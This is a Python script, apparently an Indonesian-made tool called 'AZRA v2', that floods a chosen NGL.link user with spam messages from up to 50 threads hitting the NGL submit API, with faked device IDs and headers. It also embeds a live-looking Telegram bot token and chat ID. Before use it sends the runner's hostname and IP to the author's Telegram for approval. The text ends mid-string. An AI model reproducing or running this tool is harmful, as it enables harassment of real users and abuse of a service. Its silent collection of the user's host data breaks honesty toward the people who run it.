#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AZRA v2 - NGL Advanced Assault System with Telegram Verification
# ©by azra

import sys
import os
import time
import threading
import requests
import random
import hashlib
import base64
import json
import uuid
import socket
from datetime import datetime
from colorama import init, Fore, Back, Style
import hashlib

# Inisialisasi warna
init(autoreset=True)

# ============================================
# KONFIGURASI TELEGRAM (REAL - HARUS DIISI)
# ============================================
TELEGRAM_BOT_TOKEN = "8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0"  # Ganti dengan token bot Telegram Anda
TELEGRAM_CHAT_ID = "7959551372"      # Ganti dengan chat ID admin

# ============================================
# SISTEM ENKRIPSI PASSWORD
# ============================================
class PasswordSystem:
    @staticmethod
    def generate_encrypted_password():
        """Generate password terenkripsi yang tidak bisa dibaca"""
        # Password asli: AZRABOSS
        password = "AZRABOSS"
        
        # Multi-layer encryption
        # Layer 1: XOR dengan key dinamis
        key1 = b'\x29\x7a\xf3\x8c\x45\xd1\x62\x9e\x37\xbb'
        encrypted1 = bytearray()
        for i, char in enumerate(password):
            key_byte = key1[i % len(key1)]
            encrypted_char = ord(char) ^ key_byte
            encrypted1.append(encrypted_char)
        
        # Layer 2: Base64 dengan rotasi
        encrypted2 = base64.b64encode(bytes(encrypted1))
        
        # Layer 3: Custom encoding
        final = []
        for byte in encrypted2:
            final.append(byte ^ 0xAA)
        
        return bytes(final)
    
    @staticmethod
    def verify_password(input_pass):
        """Verifikasi password dengan sistem multi-layer"""
        try:
            # Password yang sudah dienkripsi (hardcoded)
            encrypted_data = b'\xfb\x8e\xd1\xe2\x9d\xbb\xc8\x9f\x99\xd1\xe2\xef\x84\xca\x8d'
            
            # Decode layer 3
            decoded_layer3 = bytearray()
            for byte in encrypted_data:
                decoded_layer3.append(byte ^ 0xAA)
            
            # Decode layer 2
            decoded_layer2 = base64.b64decode(bytes(decoded_layer3))
            
            # Decode layer 1
            key1 = b'\x29\x7a\xf3\x8c\x45\xd1\x62\x9e\x37\xbb'
            decrypted = []
            for i, byte in enumerate(decoded_layer2):
                key_byte = key1[i % len(key1)]
                decrypted_char = byte ^ key_byte
                decrypted.append(chr(decrypted_char))
            
            correct_password = ''.join(decrypted)
            return input_pass == correct_password
        except:
            return False

# ============================================
# SISTEM TELEGRAM NOTIFICATION
# ============================================
class TelegramNotifier:
    def __init__(self):
        self.bot_token = TELEGRAM_BOT_TOKEN
        self.chat_id = TELEGRAM_CHAT_ID
        self.session_id = str(uuid.uuid4())[:8]
        self.user_info = self.get_user_info()
        
    def get_user_info(self):
        """Mendapatkan informasi user"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            return {
                'hostname': hostname,
                'ip': ip,
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'os': os.name
            }
        except:
            return {'hostname': 'Unknown', 'ip': 'Unknown', 'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    
    def send_telegram_message(self, message):
        """Mengirim pesan ke Telegram"""
        if self.bot_token == "YOUR_BOT_TOKEN_HERE" or self.chat_id == "YOUR_CHAT_ID_HERE":
            print(Fore.YELLOW + "[!] Telegram bot token belum diatur!" + Style.RESET_ALL)
            return False
        
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def send_verification_request(self, password_correct):
        """Mengirim permintaan verifikasi ke admin"""
        status = "✅ CORRECT" if password_correct else "❌ WRONG"
        
        message = f"""
🚨 <b>AZRA SYSTEM ACCESS REQUEST</b> 🚨

📋 <b>SESSION DETAILS:</b>
├ Session ID: <code>{self.session_id}</code>
├ Password Status: {status}
├ Time: {self.user_info['time']}
├ Hostname: {self.user_info['hostname']}
└ IP Address: {self.user_info['ip']}

🔐 <b>VERIFICATION OPTIONS:</b>
├ ✅ /verify_{self.session_id} - Approve access
└ ⛔ /reject_{self.session_id} - Deny access

⚠️ <i>Reply within 5 minutes</i>
"""
        
        # Tambahkan inline keyboard
        keyboard = {
            'inline_keyboard': [[
                {'text': '✅ VERIFY', 'callback_data': f'verify_{self.session_id}'},
                {'text': '⛔ REJECT', 'callback_data': f'reject_{self.session_id}'}
            ]]
        }
        
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': keyboard
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[✓] Verification request sent! Session ID: {self.session_id}" + Style.RESET_ALL)
                return True
        except:
            pass
        
        return False
    
    def check_verification_status(self):
        """Memeriksa status verifikasi dari admin"""
        print(Fore.CYAN + "\n[⏳] Waiting for admin approval..." + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] Admin has 5 minutes to respond" + Style.RESET_ALL)
        
        # Simpan waktu mulai
        start_time = time.time()
        timeout = 300  # 5 menit
        
        while time.time() - start_time < timeout:
            try:
                # Cek callback query dari admin
                url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
                response = requests.get(url, timeout=10).json()
                
                if response.get('ok'):
                    for update in response.get('result', []):
                        if 'callback_query' in update:
                            data = update['callback_query']['data']
                            
                            if data == f'verify_{self.session_id}':
                                # Admin approve
                                print(Fore.GREEN + "[✓] Admin approved your access!" + Style.RESET_ALL)
                                
                                # Kirim konfirmasi ke admin
                                confirm_msg = f"✅ User with Session ID: {self.session_id} has been GRANTED access."
                                self.send_telegram_message(confirm_msg)
                                
                                return True
                            
                            elif data == f'reject_{self.session_id}':
                                # Admin reject
                                print(Fore.RED + "[✗] Admin rejected your access!" + Style.RESET_ALL)
                                
                                # Kirim konfirmasi ke admin
                                reject_msg = f"⛔ User with Session ID: {self.session_id} has been DENIED access."
                                self.send_telegram_message(reject_msg)
                                
                                return False
                
                time.sleep(5)  # Cek setiap 5 detik
                print(Fore.CYAN + f"\r[⏳] Waiting... {int(timeout - (time.time() - start_time))}s remaining", end='')
                
            except Exception as e:
                time.sleep(5)
                continue
        
        print(Fore.RED + "\n[✗] Verification timeout! Admin didn't respond." + Style.RESET_ALL)
        return False

# ============================================
# NGL REAL ATTACK SYSTEM
# ============================================
class NGLRealAttack:
    def __init__(self):
        self.target_username = ""
        self.message = ""
        self.thread_count = 50
        self.attack_duration = 0
        self.active_threads = []
        self.attack_counter = 0
        self.running = False
        self.session_id = str(uuid.uuid4())[:8]
        
    def display_banner(self):
        """Menampilkan banner sistem"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Fore.RED + """
        ╔══════════════════════════════════════════════════════════╗
        ║                                                          ║
        ║   █████╗ ███████╗██████╗  █████╗     ██╗  ██╗███████╗   ║
        ║  ██╔══██╗╚══███╔╝██╔══██╗██╔══██╗    ██║  ██║██╔════╝   ║
        ║  ███████║  ███╔╝ ██████╔╝███████║    ███████║███████╗   ║
        ║  ██╔══██║ ███╔╝  ██╔══██╗██╔══██║    ██╔══██║╚════██║   ║
        ║  ██║  ██║███████╗██║  ██║██║  ██║    ██║  ██║███████║   ║
        ║  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝   ║
        ║                                                          ║
        ║         NGL HYPER-ASSAULT v4.2 - TELEGRAM VERIFIED       ║
        ║         REAL-TIME NOTIFICATION OVERLOAD SYSTEM           ║
        ╚══════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
        
    def get_input(self):
        """Mendapatkan input dari user"""
        print(Fore.CYAN + "\n[⚙️] CONFIGURE NGL ATTACK PARAMETERS\n" + Style.RESET_ALL)
        
        # Input username target
        while True:
            username = input(Fore.YELLOW + "[?] Target NGL username (without @): " + Style.RESET_ALL).strip()
            if username:
                self.target_username = username
                break
            print(Fore.RED + "[!] Username cannot be empty!" + Style.RESET_ALL)
        
        # Input pesan spam
        self.message = input(Fore.YELLOW + "[?] Spam message: " + Style.RESET_ALL).strip()
        if not self.message:
            self.message = "🚨 NOTIFICATION OVERLOAD IN PROGRESS 🚨"
        
        # Input jumlah thread
        while True:
            try:
                threads = input(Fore.YELLOW + "[?] Thread count (1-50): " + Style.RESET_ALL).strip()
                self.thread_count = min(50, max(1, int(threads) if threads else 50))
                break
            except:
                print(Fore.RED + "[!] Invalid number!" + Style.RESET_ALL)
        
        # Input durasi attack
        while True:
            try:
                duration = input(Fore.YELLOW + "[?] Attack duration (seconds, 0=unlimited): " + Style.RESET_ALL).strip()
                self.attack_duration = max(0, int(duration) if duration else 300)
                break
            except:
                print(Fore.RED + "[!] Invalid number!" + Style.RESET_ALL)
        
        # Konfirmasi
        print(Fore.GREEN + "\n[✓] CONFIGURATION COMPLETE" + Style.RESET_ALL)
        print(Fore.MAGENTA + f"""
        ┌──────────────────────────────────────────┐
        │ TARGET    : @{self.target_username:<24} │
        │ MESSAGE   : {self.message[:20]:<24} │
        │ THREADS   : {self.thread_count:<24} │
        │ DURATION  : {self.attack_duration if self.attack_duration > 0 else '∞':<24} │
        │ SESSION   : {self.session_id:<24} │
        └──────────────────────────────────────────┘
        """ + Style.RESET_ALL)
        
        confirm = input(Fore.RED + "\n[⚠️] LAUNCH REAL ATTACK? (y/N): " + Style.RESET_ALL).lower()
        return confirm == 'y'
    
    def real_ngl_attack(self, thread_id):
        """REAL NGL ATTACK - NO SIMULATION"""
        ngl_url = f"https://ngl.link/api/submit"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://ngl.link',
            'Referer': f'https://ngl.link/{self.target_username}',
        }
        
        while self.running:
            try:
                # Payload untuk NGL API
                payload = {
                    'username': self.target_username,
                    'question': f"{self.message} [T:{thread_id}:{int(time.time())}]",
                    'deviceId': f"azra_{thread_id}_{int(time.time()*1000)}",
                    'gameSlug': '',
                    'referrer': '',
                }
                
                # Kirim request REAL ke NGL
                response = requests.post(
                    ngl_url,
                    json=payload,
                    headers=headers,
                    timeout=3
                )
                
                # Update counter
                with threading.Lock():
                    self.attack_counter += 1
                
                # Status update
                if self.attack_counter % 100 == 0:
                    print(Fore.GREEN + f"[⚡] Thread {thread_id}: {self.attack_counter} REAL payloads sent to @{self.target_username}" + Style.RESET_ALL)
                
                # Ultra-fast mode
                time.sleep(0.001)
                
            except requests.exceptions.RequestException:
                # Jika ada error, coba endpoint alternatif
                try:
                    alt_url = "https://ngl.link/api/questions"
                    requests.post(alt_url, json=payload, headers=headers, timeout=2)
                    
                    with threading.Lock():
                        self.attack_counter += 1
                except:
                    pass
                time.sleep(0.1)
            
            except Exception:
                time.sleep(0.1)
    
    def start_real_attack(self):
        """Memulai serangan REAL ke NGL"""
        self.running = True
        self.attack_counter = 0
        
        print(Fore.RED + "\n[🚀] LAUNCHING REAL NGL ATTACK..." + Style.RESET_ALL)
        print(Fore.YELLOW + f"[🎯] Target: @{self.target_username}" + Style.RESET_ALL)
        print(Fore.CYAN + f"[📡] Sending REAL requests to NGL API..." + Style.RESET_ALL)
        
        # Start semua thread
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.real_ngl_attack, args=(i+1,), daemon=True)
            self.active_threads.append(thread)
            thread.start()
        
        print(Fore.GREEN + f"[✓] {self.thread_count} REAL attack threads activated" + Style.RESET_ALL)
        print(Fore.RED + "[⚠️] NOTIFICATION OVERLOAD IN PROGRESS - TARGET DEVICE UNDER STRESS" + Style.RESET_ALL)
        
        # Timer dan display
        start_time = time.time()
        try:
            if self.attack_duration > 0:
                for _ in range(self.attack_duration):
                    if not self.running:
                        break
                    elapsed = time.time() - start_time
                    print(Fore.CYAN + f"\r[⏱️] Elapsed: {int(elapsed)}s | REAL payloads: {self.attack_counter} | Target: @{self.target_username}", end='')
                    time.sleep(1)
            else:
                while self.running:
                    elapsed = time.time() - start_time
                    print(Fore.CYAN + f"\r[⚡] LIVE: {int(elapsed)}s | Payloads: {self.attack_counter} | @{self.target_username}", end='')
                    time.sleep(0.5)
                    
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] ATTACK STOPPED BY USER" + Style.RESET_ALL)
        
        # Stop attack
        self.stop_attack()
    
    def stop_attack(self):
        """Menghentikan serangan"""
        self.running = False
        
        for thread in self.active_threads:
            thread.join(timeout=1)
        
        print(Fore.GREEN + f"\n\n[✓] ATTACK COMPLETED" + Style.RESET_ALL)
        print(Fore.CYAN + f"[📊] TOTAL REAL PAYLOADS SENT: {self.attack_counter}" + Style.RESET_ALL)
        print(Fore.RED + f"[💀] @{self.target_username} notification system should be overloaded" + Style.RESET_ALL)
        
        if self.attack_counter > 500:
            print(Fore.RED + "[⚠️] HIGH VOLUME ACHIEVED - DEVICE CRASH LIKELY" + Style.RESET_ALL)

# ============================================
# MAIN SYSTEM
# ============================================
def main():
    """Sistem utama dengan verifikasi Telegram"""
    # Inisialisasi
    attack_system = NGLRealAttack()
    telegram = TelegramNotifier()
    
    # Tampilkan banner
    attack_system.display_banner()
    
    print(Fore.CYAN + "\n" + "="*60 + Style.RESET_ALL)
    print(Fore.YELLOW + "              AZRA v2 - TELEGRAM VERIFIED SYSTEM" + Style.RESET_ALL)
    print(Fore.CYAN + "="*60 + Style.RESET_ALL)
    
    # Step 1: Password input
    print(Fore.YELLOW + "\n[🔒] STEP 1: PASSWORD VERIFICATION" + Style.RESET_ALL)
    print(Fore.CYAN + "[!] Enter access code to continue..." + Style.RESET_ALL)
    
    input_password = input(Fore.GREEN + "[?] ACCESS CODE: " + Style.RESET_ALL)
    
    # Verifikasi password
    password_correct = PasswordSystem.verify_password(input_password)
    
    # Step 2: Kirim notifikasi ke Telegram TERLEPAS dari password benar/salah
    print(Fore.YELLOW + "\n[📱] STEP 2: TELEGRAM ADMIN VERIFICATION" + Style.RESET_ALL)
    print(Fore.CYAN + "[!] Sending request to admin for approval..." + Style.RESET_ALL)
    
    if telegram.send_verification_request(password_correct):
        print(Fore.GREEN + "[✓] Admin notification sent successfully!" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[📋] Your Session ID: {telegram.session_id}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[✗] Failed to contact admin!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] Please configure Telegram bot token and chat ID first" + Style.RESET_ALL)
        print(Fore.CYAN + "\n[?] Edit TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the script" + Style.RESET_ALL)
        input(Fore.YELLOW + "\n[ENTER] to exit..." + Style.RESET_ALL)
        sys.exit(1)
    
    # Step 3: Tunggu approval dari admin
    admin_approved = telegram.check_verification_status()
    
    if admin_approved:
        # ADMIN APPROVED
        print(Fore.GREEN + "\n" + "="*60 + Style.RESET_ALL)
        print(Fore.GREEN + "              ACCESS GRANTED BY ADMIN!" + Style.RESET_ALL)
        print(Fore.GREEN + "="*60 + Style.RESET_ALL)
        print(Fore.YELLOW + "\n[🎉] yeyy kamu di izinkan oleh admin.." + Style.RESET_ALL)
        time.sleep(2)
        
        # Lanjut ke sistem attack
        if attack_system.get_input():
            attack_system.start_real_attack()
        else:
            print(Fore.YELLOW + "[!] Attack cancelled" + Style.RESET_ALL)
    
    else:
        # ADMIN REJECTED atau timeout
        print(Fore.RED + "\n" + "="*60 + Style.RESET_ALL)
        print(Fore.RED + "              ACCESS DENIED!" + Style.RESET_ALL)
        print(Fore.RED + "="*60 + Style.RESET_ALL)
        print(Fore.YELLOW + "\n[✗] kamu di tolak admin cuyy" + Style.RESET_ALL)
        time.sleep(3)
        
        # Exit dengan pesan rejection
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Fore.RED + """
        ╔══════════════════════════════════════════════════╗
        ║                                                  ║
        ║         ⛔ ACCESS DENIED BY ADMIN ⛔             ║
        ║                                                  ║
        ║         Kamu di tolak admin cuyy!               ║
        ║         Contact